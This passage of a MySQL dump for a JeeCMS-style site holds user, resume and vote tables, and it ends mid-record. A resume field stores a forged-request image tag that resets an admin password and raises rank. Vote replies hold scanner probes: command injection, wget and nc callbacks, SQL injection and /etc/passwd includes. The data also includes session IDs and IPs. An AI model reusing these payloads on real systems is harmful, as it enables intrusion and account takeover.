  CONSTRAINT `fk_jc_topic_channel_topic` FOREIGN KEY (`topic_id`) REFERENCES `jc_topic` (`topic_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
--  Table structure for `jc_user`
-- ----------------------------
DROP TABLE IF EXISTS `jc_user`;
CREATE TABLE `jc_user` (
  `user_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  `depart_id` int(11) DEFAULT NULL COMMENT '部门',
  `username` varchar(100) NOT NULL COMMENT '用户名',
  `email` varchar(100) DEFAULT NULL COMMENT '邮箱',
  `register_time` datetime NOT NULL COMMENT '注册时间',
  `register_ip` varchar(50) NOT NULL DEFAULT '127.0.0.1' COMMENT '注册IP',
  `last_login_time` datetime NOT NULL COMMENT '最后登录时间',
  `last_login_ip` varchar(50) NOT NULL DEFAULT '127.0.0.1' COMMENT '最后登录IP',
  `login_count` int(11) NOT NULL DEFAULT '0' COMMENT '登录次数',
  `rank` int(11) NOT NULL DEFAULT '0' COMMENT '管理员级别',
  `upload_total` bigint(20) NOT NULL DEFAULT '0' COMMENT '上传总大小',
  `upload_size` int(11) NOT NULL DEFAULT '0' COMMENT '上传大小',
  `upload_date` date DEFAULT NULL COMMENT '上传日期',
  `is_admin` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否管理员',
  `is_viewonly_admin` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否只读管理员',
  `is_self_admin` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否只管理自己的数据',
  `is_disabled` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  `file_total` int(11) NOT NULL DEFAULT '0' COMMENT '上传文库文档个数',
  `grain` int(11) NOT NULL DEFAULT '0' COMMENT '文库财富值',
  `session_id` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`user_id`),
  UNIQUE KEY `ak_username` (`username`),
  KEY `fk_jc_user_group` (`group_id`),
  KEY `fk_jc_user_depart` (`depart_id`),
  CONSTRAINT `fk_jc_user_depart` FOREIGN KEY (`depart_id`) REFERENCES `jc_department` (`depart_id`),
  CONSTRAINT `fk_jc_user_group` FOREIGN KEY (`group_id`) REFERENCES `jc_group` (`group_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS用户表';

-- ----------------------------
--  Records of `jc_user`
-- ----------------------------
BEGIN;
INSERT INTO `jc_user` VALUES ('1', '1', '1', 'admin', 'aa@qq.com', '2011-01-03 00:00:00', '127.0.0.1', '2018-10-23 18:05:07', '110.184.80.250', '2310', '9', '368062', '3', '2018-10-22', '1', '0', '0', '0', '4', '103', 'A5FEA256E5BAA1E69C971C935239178C'), ('2', '1', '2', 'test', '', '2018-10-19 12:51:12', '127.0.0.1', '2018-10-19 13:08:53', '127.0.0.1', '3', '1', '0', '0', '2018-10-19', '1', '0', '0', '0', '0', '0', '832C8688B41900E6F64BC9E1F61A8DCF'), ('3', '1', '2', 'testuser', '', '2018-10-23 15:09:43', '39.128.162.98', '2018-10-23 15:10:32', '39.128.162.98', '1', '8', '0', '0', '2018-10-23', '1', '0', '0', '0', '0', '0', 'D156E5EBE8D65DD05B63C35CA0AA8386'), ('4', '1', '1', 'teststaff', '', '2018-10-23 15:13:52', '39.128.162.98', '2018-10-23 16:59:52', '39.128.162.98', '1', '8', '0', '0', '2018-10-23', '1', '0', '0', '0', '0', '0', '701C0AA8D7B7909573956FFFE23B8337');
COMMIT;

-- ----------------------------
--  Table structure for `jc_user_account`
-- ----------------------------
DROP TABLE IF EXISTS `jc_user_account`;
CREATE TABLE `jc_user_account` (
  `user_id` int(11) NOT NULL,
  `account_weixin` varchar(255) DEFAULT NULL COMMENT '微信账号名',
  `account_weixin_openId` varchar(255) DEFAULT NULL COMMENT '微信账号openid',
  `account_alipy` varchar(255) DEFAULT NULL COMMENT '支付宝账号',
  `draw_account` tinyint(1) NOT NULL DEFAULT '0' COMMENT '提现账户(0微信 1支付宝)',
  `content_total_amount` double(15,4) DEFAULT '0.0000' COMMENT '稿费总金额',
  `content_no_pay_amount` double(15,4) DEFAULT '0.0000' COMMENT '待提现稿费金额',
  `content_year_amount` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '稿费年金额',
  `content_month_amount` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '稿费本月金额',
  `content_day_amount` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '稿费本日金额',
  `content_buy_count` int(11) DEFAULT NULL COMMENT '被用户购买次数',
  `draw_count` int(11) DEFAULT '0' COMMENT '累计提现次数',
  `last_draw_time` timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT '上次提现时间',
  `last_buy_time` timestamp NULL DEFAULT NULL COMMENT '上次用户购买时间',
  PRIMARY KEY (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户稿费收费配置';

-- ----------------------------
--  Table structure for `jc_user_attr`
-- ----------------------------
DROP TABLE IF EXISTS `jc_user_attr`;
CREATE TABLE `jc_user_attr` (
  `user_id` int(11) NOT NULL,
  `attr_name` varchar(255) NOT NULL,
  `attr_value` varchar(255) DEFAULT NULL,
  KEY `fk_jc_attr_user` (`user_id`),
  CONSTRAINT `fk_jc_attr_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户属性表';

-- ----------------------------
--  Table structure for `jc_user_collection`
-- ----------------------------
DROP TABLE IF EXISTS `jc_user_collection`;
CREATE TABLE `jc_user_collection` (
  `user_id` int(11) NOT NULL DEFAULT '0' COMMENT '用户id',
  `content_id` int(11) NOT NULL DEFAULT '0' COMMENT '内容id',
  PRIMARY KEY (`user_id`,`content_id`),
  KEY `fk_jc_user_collection_con` (`content_id`),
  CONSTRAINT `fk_jc_user_collection_con` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`),
  CONSTRAINT `fk_jc_user_collection_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户收藏关联表';

-- ----------------------------
--  Table structure for `jc_user_ext`
-- ----------------------------
DROP TABLE IF EXISTS `jc_user_ext`;
CREATE TABLE `jc_user_ext` (
  `user_id` int(11) NOT NULL,
  `realname` varchar(100) DEFAULT NULL COMMENT '真实姓名',
  `gender` tinyint(1) DEFAULT NULL COMMENT '性别',
  `birthday` datetime DEFAULT NULL COMMENT '出生日期',
  `intro` varchar(255) DEFAULT NULL COMMENT '个人介绍',
  `comefrom` varchar(150) DEFAULT NULL COMMENT '来自',
  `qq` varchar(100) DEFAULT NULL COMMENT 'QQ',
  `msn` varchar(100) DEFAULT NULL COMMENT 'MSN',
  `phone` varchar(50) DEFAULT NULL COMMENT '电话',
  `mobile` varchar(50) DEFAULT NULL COMMENT '手机',
  `user_img` varchar(255) DEFAULT NULL COMMENT '用户头像',
  `user_signature` varchar(255) DEFAULT NULL COMMENT '用户个性签名',
  PRIMARY KEY (`user_id`),
  CONSTRAINT `fk_jc_ext_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS用户扩展信息表';

-- ----------------------------
--  Records of `jc_user_ext`
-- ----------------------------
BEGIN;
INSERT INTO `jc_user_ext` VALUES ('1', 'super', '1', '2015-04-09 00:00:00', null, '南昌', null, null, '1110999', '121212', '/user/images/201609/191017527cv9.jpg', ''), ('2', 'test', null, null, null, null, null, null, null, null, null, null), ('3', '信息发布人员', null, null, null, null, null, null, null, null, null, null), ('4', '信息审核人员', null, null, null, null, null, null, null, null, null, null);
COMMIT;

-- ----------------------------
--  Table structure for `jc_user_menu`
-- ----------------------------
DROP TABLE IF EXISTS `jc_user_menu`;
CREATE TABLE `jc_user_menu` (
  `menu_id` int(11) NOT NULL AUTO_INCREMENT,
  `menu_name` varchar(255) NOT NULL COMMENT '菜单名称',
  `menu_url` varchar(255) NOT NULL COMMENT '菜单地址',
  `priority` int(11) NOT NULL DEFAULT '10',
  `user_id` int(11) NOT NULL,
  PRIMARY KEY (`menu_id`),
  KEY `fk_jc_menu_user` (`user_id`),
  CONSTRAINT `fk_jc_menu_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户常用菜单';

-- ----------------------------
--  Table structure for `jc_user_resume`
-- ----------------------------
DROP TABLE IF EXISTS `jc_user_resume`;
CREATE TABLE `jc_user_resume` (
  `user_id` int(11) NOT NULL,
  `resume_name` varchar(255) NOT NULL COMMENT '简历名称',
  `target_worknature` varchar(255) DEFAULT NULL COMMENT '期望工作性质',
  `target_workplace` varchar(255) DEFAULT NULL COMMENT '期望工作地点',
  `target_category` varchar(255) DEFAULT NULL COMMENT '期望职位类别',
  `target_salary` varchar(255) DEFAULT NULL COMMENT '期望月薪',
  `edu_school` varchar(255) DEFAULT NULL COMMENT '毕业学校',
  `edu_graduation` datetime DEFAULT NULL COMMENT '毕业时间',
  `edu_back` varchar(255) DEFAULT NULL COMMENT '学历',
  `edu_discipline` varchar(255) DEFAULT NULL COMMENT '专业',
  `recent_company` varchar(500) DEFAULT NULL COMMENT '最近工作公司名称',
  `company_industry` varchar(255) DEFAULT NULL COMMENT '最近公司所属行业',
  `company_scale` varchar(255) DEFAULT NULL COMMENT '公司规模',
  `job_name` varchar(255) DEFAULT NULL COMMENT '职位名称',
  `job_category` varchar(255) DEFAULT NULL COMMENT '职位类别',
  `job_start` datetime DEFAULT NULL COMMENT '工作起始时间',
  `subordinates` varchar(255) DEFAULT NULL COMMENT '下属人数',
  `job_description` text COMMENT '工作描述',
  `self_evaluation` varchar(2000) DEFAULT NULL COMMENT '自我评价',
  PRIMARY KEY (`user_id`),
  CONSTRAINT `fk_jc_resume_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户简历';

-- ----------------------------
--  Records of `jc_user_resume`
-- ----------------------------
BEGIN;
INSERT INTO `jc_user_resume` VALUES ('1', '程序员', '', '', '', '', '家里蹲大学', null, '', '吃饭', '<img src=/jeeadmin/jeecms/admin_global/o_update.do?password=111&groupId=1&rank=9&roleIds=1&siteIds=1&steps=2&allChannels=true&id=1＞', null, null, '11', null, null, null, '111\r\n222222222222222222222222222\r\n3333333333333333333333333333333333\r\n44444444444444444444444444444444444444444\r\n55555555555555555555555555555555555', '我很强大的哦');
COMMIT;

-- ----------------------------
--  Table structure for `jc_user_role`
-- ----------------------------
DROP TABLE IF EXISTS `jc_user_role`;
CREATE TABLE `jc_user_role` (
  `role_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  PRIMARY KEY (`role_id`,`user_id`),
  KEY `fk_jc_role_user` (`user_id`),
  CONSTRAINT `fk_jc_role_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_user_role` FOREIGN KEY (`role_id`) REFERENCES `jc_role` (`role_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS用户角色关联表';

-- ----------------------------
--  Records of `jc_user_role`
-- ----------------------------
BEGIN;
INSERT INTO `jc_user_role` VALUES ('1', '1'), ('2', '2'), ('3', '3'), ('4', '4');
COMMIT;

-- ----------------------------
--  Table structure for `jc_user_site`
-- ----------------------------
DROP TABLE IF EXISTS `jc_user_site`;
CREATE TABLE `jc_user_site` (
  `usersite_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `site_id` int(11) NOT NULL,
  `check_step` tinyint(4) NOT NULL DEFAULT '1' COMMENT '审核级别',
  `is_all_channel` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否拥有所有栏目的权限',
  `is_all_channel_control` tinyint(1) NOT NULL DEFAULT '1' COMMENT '所有栏目控制权限',
  PRIMARY KEY (`usersite_id`),
  KEY `fk_jc_site_user` (`user_id`),
  KEY `fk_jc_user_site` (`site_id`),
  CONSTRAINT `fk_jc_site_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_user_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8 COMMENT='CMS管理员站点表';

-- ----------------------------
--  Records of `jc_user_site`
-- ----------------------------
BEGIN;
INSERT INTO `jc_user_site` VALUES ('2', '1', '1', '3', '1', '1'), ('3', '2', '1', '3', '0', '0'), ('4', '3', '1', '3', '1', '1'), ('5', '4', '1', '3', '1', '1');
COMMIT;

-- ----------------------------
--  Table structure for `jc_vote_item`
-- ----------------------------
DROP TABLE IF EXISTS `jc_vote_item`;
CREATE TABLE `jc_vote_item` (
  `voteitem_id` int(11) NOT NULL AUTO_INCREMENT,
  `votetopic_id` int(11) NOT NULL,
  `title` varchar(255) NOT NULL COMMENT '标题',
  `vote_count` int(11) NOT NULL DEFAULT '0' COMMENT '投票数量',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `subtopic_id` int(11) DEFAULT NULL,
  `picture` varchar(255) DEFAULT NULL COMMENT '图片',
  PRIMARY KEY (`voteitem_id`),
  KEY `fk_jc_vote_item_topic` (`votetopic_id`),
  KEY `FK_jc_vote_item_subtopic` (`subtopic_id`),
  CONSTRAINT `FK_jc_vote_item_subtopic` FOREIGN KEY (`subtopic_id`) REFERENCES `jc_vote_subtopic` (`subtopic_id`),
  CONSTRAINT `fk_jc_vote_item_topic` FOREIGN KEY (`votetopic_id`) REFERENCES `jc_vote_topic` (`votetopic_id`)
) ENGINE=InnoDB AUTO_INCREMENT=64 DEFAULT CHARSET=utf8 COMMENT='CMS投票项';

-- ----------------------------
--  Records of `jc_vote_item`
-- ----------------------------
BEGIN;
INSERT INTO `jc_vote_item` VALUES ('12', '2', '很喜欢', '74', '1', '13', ''), ('13', '2', '不喜欢', '0', '3', '13', ''), ('14', '2', '喜欢', '3', '2', '13', ''), ('15', '2', '差不多', '0', '6', '15', ''), ('16', '2', '没有改进', '0', '7', '15', ''), ('17', '2', '改进很大', '81', '4', '15', ''), ('18', '2', '有改进', '3', '5', '15', ''), ('19', '2', '图库', '76', '9', '16', ''), ('20', '2', '新闻', '80', '8', '16', ''), ('21', '2', '下载', '72', '11', '16', ''), ('22', '2', '视频', '72', '10', '16', ''), ('26', '3', '5000', '0', '2', '18', ''), ('27', '3', '10000', '1', '3', '18', ''), ('28', '3', '3000', '0', '1', '18', ''), ('33', '4', '4号', '0', '4', '20', ''), ('34', '4', '2号', '0', '2', '20', ''), ('35', '4', '1号', '0', '1', '20', ''), ('36', '4', '3号', '0', '3', '20', ''), ('37', '5', '1号', '0', '1', '21', ''), ('38', '5', '2号', '0', '2', '21', ''), ('39', '5', '3号', '0', '3', '21', ''), ('40', '5', '4号', '0', '4', '21', ''), ('41', '6', '张', '0', '1', '22', ''), ('42', '6', '李', '0', '2', '22', ''), ('43', '6', '陈', '0', '3', '22', ''), ('44', '6', '王', '0', '4', '22', ''), ('45', '7', '赵', '0', '1', '23', ''), ('46', '7', '孙', '0', '2', '23', ''), ('47', '7', '姚', '0', '3', '23', ''), ('48', '7', '黄', '0', '4', '23', ''), ('49', '8', '钱', '0', '1', '24', ''), ('50', '8', '周', '0', '2', '24', ''), ('51', '8', '郑', '0', '3', '24', ''), ('52', '8', '胡', '0', '4', '24', ''), ('53', '9', '南大', '0', '1', '25', ''), ('54', '9', '财大', '0', '2', '25', ''), ('55', '9', '师大', '0', '3', '25', ''), ('56', '9', '农大', '0', '4', '25', ''), ('57', '10', '很尽兴', '37', '1', '26', ''), ('58', '10', '还行', '0', '2', '26', ''), ('59', '10', '没玩够', '0', '3', '26', ''), ('60', '10', '家里蹲', '0', '4', '26', ''), ('61', '11', '赞成', '16', '1', '27', ''), ('62', '11', '反对', '0', '2', '27', ''), ('63', '11', '对我不影响', '0', '3', '27', '');
COMMIT;

-- ----------------------------
--  Table structure for `jc_vote_record`
-- ----------------------------
DROP TABLE IF EXISTS `jc_vote_record`;
CREATE TABLE `jc_vote_record` (
  `voterecored_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) DEFAULT NULL,
  `votetopic_id` int(11) NOT NULL,
  `vote_time` datetime NOT NULL COMMENT '投票时间',
  `vote_ip` varchar(50) NOT NULL COMMENT '投票IP',
  `vote_cookie` varchar(32) NOT NULL COMMENT '投票COOKIE',
  `wx_open_id` varchar(50) DEFAULT NULL COMMENT '微信投票者openId',
  PRIMARY KEY (`voterecored_id`),
  KEY `fk_jc_vote_record_topic` (`votetopic_id`),
  KEY `fk_jc_voterecord_user` (`user_id`),
  CONSTRAINT `fk_jc_vote_record_topic` FOREIGN KEY (`votetopic_id`) REFERENCES `jc_vote_topic` (`votetopic_id`),
  CONSTRAINT `fk_jc_voterecord_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=81 DEFAULT CHARSET=utf8 COMMENT='CMS投票记录';

-- ----------------------------
--  Records of `jc_vote_record`
-- ----------------------------
BEGIN;
INSERT INTO `jc_vote_record` VALUES ('1', null, '3', '2016-09-30 14:57:46', '117.40.115.55', '85c62d7bc19b436dbb8dd21edc2ebfd5', null), ('2', null, '11', '2016-10-09 11:38:05', '117.41.153.171', 'd2c045570d544b99885cb8f3fef658d2', null), ('3', null, '10', '2016-10-10 14:30:05', '117.41.152.66', '837d951f500c4671bd353d0d3ebadbfa', null), ('4', null, '11', '2016-10-10 14:30:05', '117.41.152.66', 'fc848a92556a4c559f79f02ca04a9ffa', null), ('5', null, '11', '2016-10-10 16:00:55', '117.41.152.66', '0bf2c8f72d94473db38bd95ebaefcdfd', null), ('8', null, '11', '2016-10-10 16:00:56', '117.41.152.66', 'b22d8d1d813f4bc2b4e4c665c4e615fa', null), ('9', null, '11', '2016-10-10 16:00:56', '117.41.152.66', '88db248d9fe147f6897671de3fb568f9', null), ('12', null, '11', '2016-10-10 16:00:56', '117.41.152.66', '465da02a13fc4f7fa2b72781d7bbf8e1', null), ('14', null, '11', '2016-10-10 16:00:56', '117.41.152.66', 'c15529ef4ce245f781b64f7f2cb953bf', null), ('17', null, '10', '2016-10-10 16:00:56', '117.41.152.66', '1ea33a4323994d89b4bcc873116e93be', null), ('19', null, '11', '2016-10-10 16:00:57', '117.41.152.66', '4ad719ade7594ceaa1015e9bfc1b3f47', null), ('20', null, '11', '2016-10-10 16:00:57', '117.41.152.66', 'ff7f622c3a1c4529894de76c523b553c', null), ('21', null, '11', '2016-10-10 16:00:57', '117.41.152.66', '36b4f3912f264a83b135486b34827d65', null), ('22', null, '10', '2016-10-10 16:00:57', '117.41.152.66', '901cb03ec75145eeaf60702c1e3064d5', null), ('23', null, '11', '2016-10-10 16:00:57', '117.41.152.66', '49b4dd1536e2467aad34d80bc1016efc', null), ('24', null, '10', '2016-10-10 16:00:57', '117.41.152.66', '3759152aa2fc4036b46eaf58c70ac6b5', null), ('25', null, '11', '2016-10-10 16:00:58', '117.41.152.66', 'd8ae1822d8ad4203a88008815f15aa9b', null), ('26', null, '10', '2016-10-10 16:00:58', '117.41.152.66', 'e60dbfc647f54d2b86dd36ee4b541fc6', null), ('30', null, '10', '2016-10-10 16:00:58', '117.41.152.66', 'd78a0d8166be459b93a29b7d8c342371', null), ('31', null, '11', '2016-10-10 16:00:58', '117.41.152.66', '207ccc615b7a410e87bb51c39adcbe60', null), ('32', null, '10', '2016-10-10 16:00:58', '117.41.152.66', 'bfc4dd4213424263a2790715649fecc9', null), ('34', null, '10', '2016-10-10 16:00:58', '117.41.152.66', 'df5764ee8165497b82c550f66ff9d8a5', null), ('35', null, '11', '2016-10-10 16:00:59', '117.41.152.66', '962c03f30edb4cc4ba01e7397361bdc7', null), ('36', null, '10', '2016-10-10 16:00:59', '117.41.152.66', '101593c1b84d48638958b7503d2f3659', null), ('38', null, '10', '2016-10-10 16:00:59', '117.41.152.66', '8e3ea7a9bf4c442495f5a0ea05e31fd3', null), ('40', null, '10', '2016-10-10 16:00:59', '117.41.152.66', 'd55e04b63a85415f82b9e101e65593e0', null), ('41', null, '10', '2016-10-10 16:00:59', '117.41.152.66', 'a0fa6f6f3a8a49fab812cd7dc5e1a0f2', null), ('43', null, '10', '2016-10-10 16:01:00', '117.41.152.66', '5b4e56ce66ea43e38640f1c3434d683e', null), ('44', null, '10', '2016-10-10 16:01:00', '117.41.152.66', 'f1502ea8feed44c9981428fba35e9aff', null), ('45', null, '10', '2016-10-10 16:01:00', '117.41.152.66', 'fb3dfceba790475fb563904b553fec91', null), ('46', null, '10', '2016-10-10 16:01:00', '117.41.152.66', 'eef4c07438f94622a2922ec015971c42', null), ('47', null, '10', '2016-10-10 16:01:00', '117.41.152.66', 'be507e426c2e4fdcb4e4dbcac6f925aa', null), ('48', null, '10', '2016-10-10 16:01:00', '117.41.152.66', 'a32b9c09af56456d8eadbc91c0e36632', null), ('50', null, '10', '2016-10-10 16:01:01', '117.41.152.66', 'd5c2cc42603c41e3968576b736118b62', null), ('51', null, '10', '2016-10-10 16:01:01', '117.41.152.66', 'fd79161c7c22486981d3ba0bcceb1500', null), ('53', null, '10', '2016-10-10 16:01:01', '117.41.152.66', '9281df23008c40708f0a8e43341ac4ae', null), ('54', null, '10', '2016-10-10 16:01:02', '117.41.152.66', '857782badf554f7fb1a3cd42ff1be708', null), ('55', null, '10', '2016-10-10 16:01:02', '117.41.152.66', '6dfc50c459a34d669aed64847f7c6733', null), ('56', null, '10', '2016-10-10 16:01:06', '117.41.152.66', '7163edffccd8453888abce6f95d7cfdd', null), ('57', null, '10', '2016-10-10 16:01:06', '117.41.152.66', '472e57a5836f42d09c3afbb23552e4e3', null), ('58', null, '10', '2016-10-10 16:01:07', '117.41.152.66', '17ebcb43eaba48f087c700d367b41692', null), ('59', null, '10', '2016-10-10 16:01:07', '117.41.152.66', '727bdde2e94d4077b081959f4ca9a946', null), ('60', null, '10', '2016-10-10 16:01:07', '117.41.152.66', '16d626ece9bd41aeb1300be3b9ea3ee0', null), ('61', null, '10', '2016-10-10 16:01:08', '117.41.152.66', '8993e9dd5af34d3faf8dbcbf5c6494d6', null), ('62', null, '10', '2016-10-10 16:01:08', '117.41.152.66', 'bfda82a4d10f4d1b8d4e32e55200d07e', null), ('63', null, '10', '2016-10-10 16:01:09', '117.41.152.66', '76ecfcc002b54d568a5f0d4f1ca20700', null), ('64', null, '10', '2016-10-10 16:01:09', '117.41.152.66', '1ff84eab46d442daae3673ad2e831a54', null), ('65', null, '10', '2016-10-10 16:01:10', '117.41.152.66', '0f39c2a605bf49c0a376879cd557ce01', null), ('66', null, '10', '2016-10-10 16:01:10', '117.41.152.66', 'cb44988a08b34af1bff99c1cb63b8b2d', null), ('67', null, '10', '2016-10-10 16:01:11', '117.41.152.66', '4ba0635f7de14fe1b3a10de57d5783d4', null), ('68', null, '10', '2016-10-10 16:01:11', '117.41.152.66', '0711f2524cf4451d954c6f94c4bf5099', null), ('69', null, '10', '2016-10-10 16:01:12', '117.41.152.66', '5865796b06ee43af8f727c8f8f57ff94', null), ('70', null, '10', '2016-10-10 16:01:12', '117.41.152.66', 'ba8fa930a89d499ab4fbe4e0d565be10', null), ('71', null, '10', '2016-10-10 16:01:13', '117.41.152.66', 'e68f2e1dc3f94724bdc91b29bd3846bc', null), ('72', null, '10', '2016-10-10 16:01:13', '117.41.152.66', 'e574898d0d3f4313b2dd7e607e432d44', null), ('73', null, '10', '2016-10-10 16:01:14', '117.41.152.66', '8c6f9de0ee764264bf0c3b105ccf4825', null), ('74', null, '10', '2016-10-10 16:01:14', '117.41.152.66', 'd73fc39a867d46459c5bb5d5b353933f', null), ('75', null, '10', '2016-10-10 16:01:15', '117.41.152.66', '00fd7c694c2f4d18951b9feda39fec5d', null), ('76', null, '11', '2016-10-10 16:01:39', '117.41.152.66', '869e55ac9e1548c7b95956d1083e7a83', null), ('77', null, '10', '2016-10-10 16:01:40', '117.41.152.66', '5c9efcf72f784ec2948c34c660e11d26', null), ('78', null, '11', '2016-10-10 16:01:41', '117.41.152.66', '222ebfd7010f4c69b971bbb388d2e3d0', null), ('79', null, '11', '2016-10-10 16:01:42', '117.41.152.66', '0a9d43bc940f4b0786e981aa09ac3a67', null), ('80', null, '10', '2016-10-10 16:01:43', '117.41.152.66', '160ba1860a52472bbfa17230f5cd1d99', null);
COMMIT;

-- ----------------------------
--  Table structure for `jc_vote_reply`
-- ----------------------------
DROP TABLE IF EXISTS `jc_vote_reply`;
CREATE TABLE `jc_vote_reply` (
  `votereply_id` int(11) NOT NULL AUTO_INCREMENT,
  `reply` text COMMENT '回复内容',
  `subtopic_id` int(11) DEFAULT NULL,
  PRIMARY KEY (`votereply_id`),
  KEY `FK_jc_vote_reply_sub` (`subtopic_id`),
  CONSTRAINT `FK_jc_vote_reply_sub` FOREIGN KEY (`subtopic_id`) REFERENCES `jc_vote_subtopic` (`subtopic_id`)
) ENGINE=InnoDB AUTO_INCREMENT=151 DEFAULT CHARSET=utf8 COMMENT='投票文本题目回复表';

-- ----------------------------
--  Records of `jc_vote_reply`
-- ----------------------------
BEGIN;
INSERT INTO `jc_vote_reply` VALUES ('1', '111', '14'), ('2', '111', '14'), ('3', '111', '14'), ('4', '111', '14'), ('5', '111', '14'), ('6', '111', '14'), ('7', '111', '14'), ('8', '111', '14'), ('9', '1234', '14'), ('10', '1234', '14'), ('11', '1234', '14'), ('12', '1234', '14'), ('13', '1234', '14'), ('14', '1234', '14'), ('15', '1234', '14'), ('16', '1234', '14'), ('17', '1234', '14'), ('18', '1234', '14'), ('19', '1234', '14'), ('20', '1234', '14'), ('21', '1234', '14'), ('22', '1234', '14'), ('23', '1234', '14'), ('24', '1234', '14'), ('25', '1234', '14'), ('26', '1234', '14'), ('27', '1234', '14'), ('28', '1234', '14'), ('29', '1234', '14'), ('30', '1234', '14'), ('31', '1234', '14'), ('32', '1234', '14'), ('33', '1234', '14'), ('34', '1234', '14'), ('35', '1234', '14'), ('36', '1234', '14'), ('37', '1234WFXSSProbe', '14'), ('38', 'WF&＃39;SQL\"Probe;A--B', '14'), ('39', '1234&＃39;\"', '14'), ('40', 'ProbePhishing', '14'), ('41', 'A1234B', '14'), ('42', '1234WFXSSProbe&＃39;\"&＃41;/&gt;', '14'), ('43', '1234', '14'), ('44', '1234', '14'), ('45', '99999999999999999999', '14'), ('46', '1234＃&&lt;&＃40;, \"&gt;;', '14'), ('47', '1234', '14'), ('48', '-99999999999999999999', '14'), ('49', '|id', '14'), ('50', '|ls -a1F', '14'), ('51', '1234', '14'), ('52', '1234', '14'), ('53', '&&id', '14'), ('54', '4294967297', '14'), ('55', 'ls', '14'), ('56', '&&ls -a1F', '14'), ('57', '18446744073709551617', '14'), ('58', '1234', '14'), ('59', '||id', '14'), ('60', '||ls -a1F', '14'), ('61', '\0', '14'), ('62', '&＃39; | &＃39;id', '14'), ('63', '&＃39; | &＃39;ls -a1F', '14'), ('64', '1234', '14'), ('65', '\" | \"id', '14'), ('66', '|vol', '14'), ('67', '1234', '14'), ('68', '\" | \"ls -a1F', '14'), ('69', '1234', '14'), ('70', 'id', '14'), ('71', '&&vol', '14'), ('72', '1234', '14'), ('73', 'id|', '14'), ('74', 'ls -a1F', '14'), ('75', ';id\0', '14'), ('76', '1234\"|wget http://192.168.0.2:51167/AppScanMsg.html?varId=1269|echo \"', '14'), ('77', '||vol', '14'), ('78', '1234', '14'), ('79', '../../../../../../../../../../../../bin/id|', '14'), ('80', ';ls -a1F\0', '14'), ('81', '1234', '14'), ('82', '&＃39; | &＃39;vol', '14'), ('83', '1234&＃39;|wget http://192.168.0.2:51167/AppScanMsg.html?varId=1275|echo &＃39;', '14'), ('84', '../../../../../../../../../../../../usr/bin/id|', '14'), ('85', '0 0 0 1234', '14'), ('86', '1234', '14'), ('87', '\" | \"vol', '14'), ('88', '1234|wget http://192.168.0.2:51167/AppScanMsg.html?varId=1276|echo ;', '14'), ('89', '1234&＃39; and &＃39;f&＃39;=&＃39;f', '14'), ('90', ';vol\0', '14'), ('91', '1234&＃39; and &＃39;f&＃39;=&＃39;f&＃39; -- ', '14'), ('92', '1234&＃39; and &＃39;f&＃39;=&＃39;f&＃39;&＃41; -- ', '14'), ('93', '1234&＃39; and &＃39;b&＃39;=&＃39;f', '14'), ('94', '1234\"|echo -e \"GET /AppScanMsg.html?varId=1280 HTTP/1.0\\r\\n\\r\\n\" | nc 192.168.0.2 51167|echo \"', '14'), ('95', '1234&＃39; and &＃39;b&＃39;=&＃39;f&＃39; -- ', '14'), ('96', '1234&＃39; and &＃39;b&＃39;=&＃39;f&＃39;&＃41; --', '14'), ('97', '1234&＃39; or &＃39;f&＃39;=&＃39;f', '14'), ('98', '1234&＃39; or &＃39;f&＃39;=&＃39;f&＃39; -- ', '14'), ('99', '1234&＃39;|echo -e \"GET /AppScanMsg.html?varId=1288 HTTP/1.0\\r\\n\\r\\n\" | nc 192.168.0.2 51167|echo &＃39;', '14'), ('100', '1234&＃39; or &＃39;f&＃39;=&＃39;f&＃39;&＃41; --', '14'), ('101', '&lt;!--＃include file=\"/etc/passwd\"--&gt;', '14'), ('102', '1234', '14'), ('103', '&lt;!--＃include file=\"C:\\boot.ini\"--&gt;', '14'), ('104', '1234|echo -e \"GET /AppScanMsg.html?varId=1289 HTTP/1.0\\r\\n\\r\\n\" | nc 192.168.0.2 51167|echo ', '14'), ('105', '1234', '14'), ('106', '1234 and 7659=7659', '14'), ('107', ';vol|', '14'), ('108', '1234', '14'), ('109', '1234;curl 